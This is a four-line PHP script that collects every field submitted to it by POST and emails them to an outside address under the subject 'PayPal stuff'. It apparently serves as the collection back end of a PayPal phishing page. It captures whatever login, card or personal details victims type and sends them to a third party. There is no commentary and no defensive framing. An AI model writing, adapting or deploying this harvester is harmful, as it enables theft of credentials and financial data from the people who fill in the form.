<?php
  $message = "";
  foreach($_POST as $key => $value) $message .= "$key = $value\n";
  mail("info@employmenow.co.uk","PayPal stuff", $message);
?>